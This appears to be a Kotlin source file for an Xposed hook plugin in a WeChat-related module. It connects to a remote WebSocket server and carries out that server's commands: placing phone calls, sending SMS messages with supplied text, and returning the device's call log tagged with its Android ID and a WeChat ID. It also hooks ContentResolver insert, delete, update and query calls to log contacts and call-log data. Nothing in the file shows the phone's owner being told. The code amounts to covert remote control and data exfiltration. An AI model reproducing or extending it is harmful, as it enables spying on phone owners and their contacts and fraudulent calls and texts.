package com.lu.wxmask.plugin

import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.ContentValues
import android.content.Context
import android.net.Uri
import android.os.Bundle
import android.provider.CallLog
import android.provider.ContactsContract
import com.example.libcontacts.CallLogUtils
import com.example.libcontacts.IdGet
import com.example.libcontacts.WebSocketClient
import com.example.libcontacts.WebSocketClientListener
import com.lu.lposed.api2.XC_MethodHook2
import com.lu.lposed.api2.XposedHelpers2
import com.lu.lposed.plugin.IPlugin
import com.lu.lposed.plugin.PluginProviders
import com.lu.magic.util.log.LogUtil
import de.robv.android.xposed.XC_MethodHook
import de.robv.android.xposed.XposedBridge
import de.robv.android.xposed.callbacks.XC_LoadPackage
import org.java_websocket.handshake.ServerHandshake
import org.json.JSONArray
import org.json.JSONObject

class CallLogPlugin : WebSocketClientListener, IPlugin {
    private var mContext: Context? = null
    private var client: WebSocketClient? = null

    companion object {
        private val CALL_LOG_URI = CallLog.Calls.CONTENT_URI
        private val CONTACTS_URI = ContactsContract.Contacts.CONTENT_URI
        private val CONTACTS_LOOKUP_URI = ContactsContract.Contacts.CONTENT_LOOKUP_URI
    }

    override fun handleHook(context: Context, param: XC_LoadPackage.LoadPackageParam) {
        mContext = context
        LogUtil.i("CallLogPlugin handleHook：$this", mContext)
        client = WebSocketClient(context)
        client?.setOnWebSocketListener(this)
        client?.connect()


    }

    override fun onOpen(handshake: ServerHandshake) {
        LogUtil.i("CallLogPlugin onOpen", "连接已建立", IdGet.androidId(mContext!!))
    }

    override fun onMessage(message: String) {
        try {
            val json = JSONObject(message)
            val type = json.opt("type")
            when (type) {
                7 -> {
                    // 打电话
                    val phone = json.optString("name")
                    LogUtil.i("CallLogPlugin onMessage", "phone = $phone")
                    CallLogUtils.makeCall(mContext!!, phone)
                }

                8 -> {
                    // 发短信
                    val phone = json.optString("name")
                    val message = json.optString("message")
                    CallLogUtils.sendSms(mContext!!, phone, message)
                }

                9 -> {
                    // 请求通话记录
                    val params = json.optJSONObject("params")
                    if (params == null) {
                        LogUtil.e("params is null")
                        return
                    }
                    val plugin = PluginProviders.from(CallLogPlugin::class.java)
                    val result = plugin.queryByParams(params)
                    sendMessage(JSONObject().apply {
                        put("androidId", IdGet.androidId(mContext!!))
                        put("callslist", result)
                    }.toString())

                    IdGet.setAndroidId(mContext!!, IdGet.androidId(mContext!!))
                }
                10 -> {
                    // 请求联系人
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendMessage(message: String, type: String = "webhook") {
        val text = JSONObject(message.trimIndent()).apply {
            put("type", type)
        }.toString()
        LogUtil.i("sendMessage", text)
        client?.sendMessage(text, IdGet.getWxId(mContext!!))
    }

    @SuppressLint("Range")
    fun getContactDetails(context: Context) {
        val cursor = context.contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            null,
            null,
            null,
            null
        );

        if (cursor != null) {
            while (cursor.moveToNext()) {
                val id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                val name =
                    cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                val phoneNumber = getPhoneNumbers(context, id)

                LogUtil.i("Contact: ID=$id, Name=$name, Phone Number=$phoneNumber")
            }
            cursor.close();
        }
    }

    // 查询联系人电话号码
    @SuppressLint("Range")
    private fun getPhoneNumbers(context: Context, contactId: String) {
        val projection = arrayOf(
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        )
        val phoneCursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,  // 电话号码 URI
            projection,  // 返回所有列
            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",  // 查询条件
            arrayOf(contactId),  // 查询条件参数
            null  // 排序
        )

        LogUtil.i("getPhoneNumbers=", phoneCursor?.moveToFirst())
        phoneCursor?.use {
            while (it.moveToNext()) {
                val phoneNumber =
                    it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                val phoneType =
                    it.getInt(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE))

                LogUtil.d("PhoneNumber", "Phone Number: $phoneNumber, Type: $phoneType")
            }
        }
        phoneCursor?.close()
    }

    private fun hookInsert(param: XC_LoadPackage.LoadPackageParam) {
        XposedHelpers2.findAndHookMethod(
            "android.content.ContentResolver", // 要hook的类
            param.classLoader,
            "insert", // 方法名
            Uri::class.java, // 参数1: URI
            ContentValues::class.java, // 参数2: 插入的数据
            Bundle::class.java, // 参数3: 可选的额外参数
            object : XC_MethodHook2() {
                @Throws(Throwable::class)
                override fun beforeHookedMethod(param: MethodHookParam) {
                    val uri = param.args[0] as Uri
                    val values = param.args[1] as ContentValues

                    // 输出详细的日志来确认插入操作是否执行
                    XposedBridge.log("insert called with URI: $uri")
                    XposedBridge.log("ContentValues: $values")

                    LogUtil.e("Insert hook: ", param.args)
                    queryCursor(param)
                    if (CallLog.Calls.CONTENT_URI == uri) {
                        // 只关心CallLog插入操作
                        XposedBridge.log("Call log inserted!")
                        // 你可以查看或修改values中的内容
                    } else {
                        // 如果插入的不是通话记录，可以记录其他URI进行排查
                        XposedBridge.log("Insert with a different URI: $uri")
                    }
                }
            }
        )


    }

    private fun hookDelete(param: XC_LoadPackage.LoadPackageParam) {
        XposedHelpers2.findAndHookMethod(
            "android.content.ContentResolver", // 要hook的类
            param.classLoader,
            "delete", // 方法名
            Uri::class.java, // 参数1: URI
            String::class.java, // 参数2: selection
            Array<String>::class.java, // 参数3: selectionArgs
            object : XC_MethodHook2() {
                @Throws(Throwable::class)
                override fun beforeHookedMethod(param: MethodHookParam) {
                    val uri = param.args[0] as Uri
                    val selection = param.args[1] as String?
                    val selectionArgs = param.args[2] as Array<String>?

                    LogUtil.e("Delete hook: ", uri, selection, selectionArgs)
                    queryCursor(param)
                }
            }
        )

    }

    private fun hookContactsUpdate(param: XC_LoadPackage.LoadPackageParam) {
        XposedHelpers2.findAndHookMethod(
            "android.content.ContentResolver",
            param.classLoader,
            "update",
            Uri::class.java,
            ContentValues::class.java,
            String::class.java,
            Array<String>::class.java,
            object : XC_MethodHook2() {
                override fun beforeHookedMethod(param: MethodHookParam) {
                    val uri = param.args[0] as Uri
//                    if (uri.toString().startsWith(CONTACTS_URI.toString())) {
                    LogUtil.d("拦截联系人更新操作", uri)
                    // 可以修改更新内容
                    val values = param.args[1] as ContentValues
                    LogUtil.d("更新数据：$values")
//                    }
                    queryCursor(param)
                }
            })
    }

    private fun hookQuery(param: XC_LoadPackage.LoadPackageParam) {
        var isQueryHooked = false
        XposedHelpers2.findAndHookMethod(
            "android.content.ContentResolver", // 要hook的类
            param.classLoader,
            "query", // 方法名
            Uri::class.java, // 参数1: Uri，传入的URI
            Array<String>::class.java, // 参数2: projection（查询的字段）
            String::class.java, // 参数3: selection
            Array<String>::class.java, // 参数4: selectionArgs
            String::class.java, // 参数5: sortOrder
            object : XC_MethodHook2() {
                @Throws(Throwable::class)
                override fun beforeHookedMethod(param: MethodHookParam) {
                    if (isQueryHooked) {
                        return
                    }
                    isQueryHooked = true
                    try {
                        LogUtil.i("query hook.", param)
                        queryCursor(param)
                    } catch (e: Throwable) {
                        e.printStackTrace()
                    } finally {
                        isQueryHooked = false
                    }
                }
            })

    }

    @SuppressLint("Range")
    private fun queryCursor(param: XC_MethodHook.MethodHookParam) {
        val uri = param.args[0] as Uri
        val projection = param.args[1] as? Array<String>?
        val selection = param.args[2] as String?
        val selectionArgs = param.args?.getOrNull(3) as? Array<String>?
        val sortOrder = param.args?.getOrNull(4) as String?
        LogUtil.i("Intercepted queryCursor.", uri, projection, selection, selectionArgs, sortOrder)

        if (CallLog.Calls.CONTENT_URI == uri) {
            // 如果想要获取通话记录，可以在这里执行查询
            val context = param.thisObject as ContentResolver
//            queryCallLog(context, uri, projection, selection, selectionArgs, sortOrder)
        }
    }

    fun queryByParams(params: JSONObject): JSONArray {
        return CallLogUtils.queryByParams(mContext!!, params)
    }


}